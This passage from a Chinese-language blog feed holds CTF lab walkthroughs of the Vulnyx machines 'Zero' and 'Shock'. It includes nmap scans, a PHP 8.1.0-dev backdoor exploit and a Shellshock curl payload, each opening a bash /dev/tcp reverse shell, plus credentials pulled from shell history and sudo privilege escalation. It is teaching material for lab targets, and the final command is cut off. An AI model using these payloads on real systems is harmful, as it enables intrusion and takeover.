class="hljs-built_in">groups</span>=1000(tommy4)<br></code></pre></td></tr></table></figure><h1 id="四、查看flag"><a href="#四、查看flag" class="headerlink" title="四、查看flag"></a>四、查看flag</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">rootbash-5.0# <span class="hljs-built_in">cat</span> /root/root.txt /home/tommy4/user.txt <br>flag&#123;root-6abd51ee921a5a9db30b78cf17d85dc7&#125;<br>flag&#123;user-96d6fc824b0ea03a4e3dbd81f9c5cd76&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
      <tag>弱口令</tag>
      
      <tag>cms-Pluck</tag>
      
      <tag>提权-ld.so.preload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Zero</title>
    <link href="/Vulnyx/Zero/"/>
    <url>/Vulnyx/Zero/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li><a href="https://vulnyx.com/">https://vulnyx.com/</a></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sn 192.168.2.0/24                <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-08 15:36 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00078s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00049s latency).<br>MAC Address: 08:00:27:48:64:28 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.39<br>Host is up (0.015s latency).<br>MAC Address: 08:00:27:E6:6C:CB (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (5 hosts up) scanned <span class="hljs-keyword">in</span> 2.10 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.39</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.39                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-08 15:36 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.39<br>Host is up (0.00073s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>8080/tcp open  http-proxy<br>MAC Address: 08:00:27:E6:6C:CB (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 32.87 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、80、8080</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80,8080 192.168.2.39<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-08 15:37 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.39<br>Host is up (0.00080s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)<br>|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)<br>|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.56 ((Debian))<br>|_http-server-header: Apache/2.4.56 (Debian)<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="hljs-string">8080/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)</span><br><span class="hljs-string">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="hljs-string">|_http-title: Site doesn&#x27;</span>t have a title (text/html; charset=UTF-8).<br>MAC Address: 08:00:27:E6:6C:CB (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.67 seconds<br></code></pre></td></tr></table></figure><h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sU --top-ports 100 192.168.2.39                         <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-08 15:38 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.39<br>Host is up (0.00100s latency).<br>All 100 scanned ports on 192.168.2.39 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 55 closed udp ports (port-unreach), 45 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:E6:6C:CB (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 52.85 seconds<br></code></pre></td></tr></table></figure><h1 id="二、Zerodium漏洞利用"><a href="#二、Zerodium漏洞利用" class="headerlink" title="二、Zerodium漏洞利用"></a>二、Zerodium漏洞利用</h1><p>访问80端口和8080端口，都是显示<code>Zerodium</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601081539598.png"></p><p>说明是使用<code>Zerodium</code><br>结合nmap扫描的结果，在8080端口显示<code>PHP cli server 5.5 or later (PHP 8.1.0-dev)</code></p><h2 id="PHP-8-1-0-dev后门命令执行"><a href="#PHP-8-1-0-dev后门命令执行" class="headerlink" title="PHP-8.1.0-dev后门命令执行"></a>PHP-8.1.0-dev后门命令执行</h2><p>而PHP-8.1.0-dev 存在后门命令执行漏洞<br>关键在于<code>User-agentt:zerodium</code>字段，后面加上相应的php函数，得到执行结果</p><p>尝试执行id，成功获取到<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601081556747.png"></p><h1 id="三、获取到shell"><a href="#三、获取到shell" class="headerlink" title="三、获取到shell"></a>三、获取到shell</h1><p>反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zerodiumsystem(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.2.4/4444 0&gt;&amp;1&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure><p>获取到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp/nc.exe]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.39] 42942<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>root@6ad9beefaa2d:/var/www/html# <span class="hljs-built_in">id</span> <br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p>根目录下面存在<code>.dockerenv</code>，因此判断是在docker容器里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@6ad9beefaa2d:/var/www/html# <span class="hljs-built_in">ls</span> -la /<br><span class="hljs-built_in">ls</span> -la /<br>total 84<br>drwxr-xr-x   1 root root 4096 May  5  2023 .<br>drwxr-xr-x   1 root root 4096 May  5  2023 ..<br>-rwxr-xr-x   1 root root    0 May  5  2023 .dockerenv<br>drwxr-xr-x   1 root root 4096 May  5  2023 bin<br>drwxr-xr-x   2 root root 4096 Nov 22  2020 boot<br>drwxr-xr-x   5 root root  340 Jan  8 07:36 dev<br>....<br></code></pre></td></tr></table></figure><h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><h2 id="1、获取liam权限"><a href="#1、获取liam权限" class="headerlink" title="1、获取liam权限"></a>1、获取liam权限</h2><p>查看文件里面的内容，最终在<code>/root/.bash_history</code>中找到ssh的登录凭证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@6ad9beefaa2d:~# <span class="hljs-built_in">cat</span> .bash_history<br><span class="hljs-built_in">cat</span> .bash_history<br>sshpass -p <span class="hljs-string">&#x27;L14mD0ck3Rp0w4&#x27;</span> ssh liam@127.0.0.1<br></code></pre></td></tr></table></figure><p>SSH登录凭证<code>liam:L14mD0ck3Rp0w4</code></p><p>获取到liam的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# ssh liam@192.168.2.39                                   <br>liam@zero:~$ <span class="hljs-built_in">id</span><br>uid=1000(liam) gid=1000(liam) grupos=1000(liam)<br></code></pre></td></tr></table></figure><h2 id="2、获取ROOT权限"><a href="#2、获取ROOT权限" class="headerlink" title="2、获取ROOT权限"></a>2、获取ROOT权限</h2><p>查看<code>sudo -l</code>，发现当前用户可以用root权限执行<code>/usr/bin/wine</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">liam@zero:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> liam on zero:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User liam may run the following commands on zero:<br>    (root) NOPASSWD: /usr/bin/wine<br></code></pre></td></tr></table></figure><p><code>/usr/bin/wine</code> 是 Linux 系统中 <strong>Wine</strong>（Wine Is Not an Emulator）程序的可执行文件路径。Wine 是一个兼容层，允许在类 Unix 操作系统（如 Linux、macOS）上运行 Windows 应用程序，而无需使用 Windows 操作系统本身。</p><p>直接执行<code>cmd.exe</code>，成功获取到root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">liam@zero:/home$ <span class="hljs-built_in">sudo</span> /usr/bin/wine cmd.exe<br>it looks like wine32 is missing, you should install it.<br>multiarch needs to be enabled first.  as root, please<br>execute <span class="hljs-string">&quot;dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp;</span><br><span class="hljs-string">apt-get install wine32&quot;</span><br>Microsoft Windows 6.1.7601<br><br>Z:\home&gt;<span class="hljs-built_in">echo</span> %USERNAME% &amp; hostname<br>root <br>ZERO<br></code></pre></td></tr></table></figure><h1 id="五、查看FLAG"><a href="#五、查看FLAG" class="headerlink" title="五、查看FLAG"></a>五、查看FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Z:\home&gt;<span class="hljs-built_in">type</span> \root\root.txt \home\liam\user.txt<br>\root\root.txt<br>e9100b368f0025971ecc987c0a3b2c8b<br><br>\home\liam\user.txt<br>fa2cda1dfeef0af189e4f1b6e3dd99b5<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Vulnyx</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Zerodium</tag>
      
      <tag>PHP-8.1.0-dev</tag>
      
      <tag>sudo-wine</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shock</title>
    <link href="/Vulnyx/Shock/"/>
    <url>/Vulnyx/Shock/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li><a href="https://vulnyx.com/">https://vulnyx.com/</a></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-07 09:27 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00025s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00019s latency).<br>MAC Address: 08:00:27:69:9E:18 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.36<br>Host is up (0.0019s latency).<br>MAC Address: 08:00:27:01:CD:F0 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.15 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.36</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.36                          <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-07 09:28 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.36<br>Host is up (0.0012s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT   STATE    SERVICE<br>21/tcp filtered ftp<br>22/tcp open     ssh<br>80/tcp open     http<br>MAC Address: 08:00:27:01:CD:F0 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 28.21 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、80</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p21,22,80 192.168.2.36<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-07 09:28 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.36<br>Host is up (0.00098s latency).<br><br>PORT   STATE  SERVICE VERSION<br>21/tcp closed ftp<br>22/tcp open   ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 37:36:60:3e:26:ae:23:3f:e1:8b:5d:18:e7:a7:c7:ce (RSA)<br>|   256 34:9a:57:60:7d:66:70:d5:b5:ff:47:96:e0:36:23:75 (ECDSA)<br>|_  256 ae:7d:ee:fe:1d:bc:99:4d:54:45:3d:61:16:f8:6c:87 (ED25519)<br>80/tcp open   http    Apache httpd 2.4.38 ((Debian))<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="hljs-string">MAC Address: 08:00:27:01:CD:F0 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds</span><br></code></pre></td></tr></table></figure><h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sU --top-ports 100 192.168.2.36                       <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-07 09:29 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.36<br>Host is up (0.00087s latency).<br>All 100 scanned ports on 192.168.2.36 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 56 closed udp ports (port-unreach), 44 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:01:CD:F0 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 51.62 seconds<br></code></pre></td></tr></table></figure><h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><h2 id="1、网站"><a href="#1、网站" class="headerlink" title="1、网站"></a>1、网站</h2><p>访问80端口<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601070944068.png"></p><h2 id="2、目录扫描"><a href="#2、目录扫描" class="headerlink" title="2、目录扫描"></a>2、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# dirsearch -u <span class="hljs-string">&quot;http://192.168.2.36&quot;</span>     <br>....<br>[09:35:51] 403 -  277B  - /cgi-bin/<br>....<br></code></pre></td></tr></table></figure><p>找到一个<code>/cgi-bin</code></p><p>再次进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# dirsearch -u <span class="hljs-string">&quot;http://192.168.2.36/cgi-bin/&quot;</span><br><br>[09:54:07] Starting: cgi-bin/<br>[09:55:29] 500 -  610B  - /cgi-bin/shell.sh<br></code></pre></td></tr></table></figure><p>找到路径<code>/cgi-bin/shell.sh</code></p><h2 id="3、CGI-bin"><a href="#3、CGI-bin" class="headerlink" title="3、CGI-bin"></a>3、CGI-bin</h2><p>💡Tip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/cgi.html#shellshock<br></code></pre></td></tr></table></figure><p>CGI脚本是 Perl 脚本，因此，如果您攻破了一台可以执行<code>.cgi脚本</code>的服务器，您可以上传一个 Perl 反向 shell（<code>/usr/share/webshells/perl/perl-reverse-shell.pl</code>），将扩展名从.pl更改为.cgi，赋予执行权限（<code>chmod +x</code>），然后通过 Web 浏览器访问该反向 shell并执行脚本。</p><p>使用NAMP测试，是否存在漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap 192.168.2.36 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/shell.sh<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-07 10:06 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.36<br>Host is up (0.00062s latency).<br><br>PORT   STATE SERVICE<br>80/tcp open  http<br>| http-shellshock: <br>|   VULNERABLE:<br>|   HTTP Shellshock vulnerability<br>|     State: VULNERABLE (Exploitable)<br>|     IDs:  CVE:CVE-2014-6271<br>|       This web application might be affected by the vulnerability known<br>|       as Shellshock. It seems the server is executing commands injected<br>|       via malicious HTTP headers.<br>|             <br>|     Disclosure <span class="hljs-built_in">date</span>: 2014-09-24<br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271<br>|       http://www.openwall.com/lists/oss-security/2014/09/24/10<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169<br>|_      http://seclists.org/oss-sec/2014/q3/685<br>MAC Address: 08:00:27:01:CD:F0 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 0.50 seconds<br></code></pre></td></tr></table></figure><h1 id="三、获取www-data权限"><a href="#三、获取www-data权限" class="headerlink" title="三、获取www-data权限"></a>三、获取www-data权限</h1><p>使用命令反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -H <span class="hljs-string">&#x27;Cookie: () &#123; :;&#125;; /bin/bash -i &gt;&amp; /dev/tcp/192.168.2.4/4444 0&gt;&amp;1&#x27;</span> http://192.168.2.36/cgi-bin/shell.sh<br></code></pre></td></tr></table></figure><p>获取到www-data权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nc -lvnp 4444                         <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.36] 60550<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (492): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>bash-4.3$ <span class="hljs-built_in">id</span> <br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><h2 id="1、获取will权限"><a href="#1、获取will权限" class="headerlink" title="1、获取will权限"></a>1、获取will权限</h2><p>查看<code>sudo -l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.3$ <span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> www-data on shock:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User www-data may run the following commands on shock:<br>    (will) NOPASSWD: /usr/bin/busybox<br></code></pre></td></tr></table></figure><p><code>www-data</code>用户可以使用 <code>will</code> 用户身份来执行 busybox</p><p>直接使用下面方式提权即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -u will busybox 